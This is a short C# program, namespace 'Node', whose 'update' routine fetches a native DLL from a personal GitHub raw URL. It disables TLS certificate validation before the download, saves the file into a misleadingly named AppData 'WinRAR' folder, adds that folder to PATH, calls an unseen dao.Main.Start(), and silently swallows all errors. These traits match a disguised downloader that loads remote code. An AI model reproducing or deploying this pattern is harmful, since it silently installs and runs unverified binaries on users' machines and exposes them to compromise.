using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Node
{
    public class Program
    {
        static void Main(string[] args)
        {
            StartUpdate();
        }

        public static void StartUpdateThread()
        {
            Thread thread = new Thread(() => StartUpdate());
            thread.Start();
        }

        public static void StartUpdate()
        {
            try
            {
                string dllFileName = "SQLite.Interop.dll";
                string APPDATA_PATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string dllPath = Path.Combine(APPDATA_PATH, @"WinRAR");
                if (!Directory.Exists(dllPath)) Directory.CreateDirectory(dllPath);
                string dllFullName = Path.Combine(dllPath, dllFileName);
                if (!File.Exists(dllFullName))
                    using (var client = new WebClient())
                    {
                        System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                        if (Environment.Is64BitOperatingSystem)
                        {
                            client.DownloadFile("https://raw.githubusercontent.com/valloon91105/sqlite/master/x64/SQLite.Interop.dll", dllFullName);
                        }
                        else
                        {
                            client.DownloadFile("https://raw.githubusercontent.com/valloon91105/sqlite/master/x86/SQLite.Interop.dll", dllFullName);
                        }
                    }
                string nowEnvPath = Environment.GetEnvironmentVariable("PATH");
                if (!nowEnvPath.Contains(dllPath))
                    Environment.SetEnvironmentVariable("PATH", Environment.GetEnvironmentVariable("PATH") + ";" + dllPath);
                dao.Main.Start();
            }
            catch { }
        }
    }
}
